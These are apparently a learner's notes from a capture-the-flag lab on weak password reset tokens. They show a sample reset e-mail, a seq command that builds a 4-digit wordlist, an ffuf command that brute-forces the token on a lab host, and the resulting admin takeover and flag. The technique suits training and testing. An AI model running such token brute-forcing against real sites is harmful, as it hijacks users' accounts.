To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it. In this example, let us assume we have received the following password reset e-mail:

Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.


As we can see, the password reset link contains the reset token in the GET-parameter token. In this example, the token is 7351. Given that the token consists of only a 4-digit number, there can be only 10,000 possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.

Making a custom wordlist that matches the token combo 

EXAMPLE: MJBUCKNER@htb[/htb]$ seq -w 0 9999 > tokens.txt

ffuf EXAMPLE: ffuf -w tokens.txt -u http://94.237.48.47:40609/reset_password.php?token=FUZZ -fr "The provided token is invalid" 

output = 3006 

now go to http://94.237.48.47:40609/reset_password.php?token=3006 -> reset password for admin and then log in with newly reset password to get HTB{36da098385e641d54e1b2750721d816e}
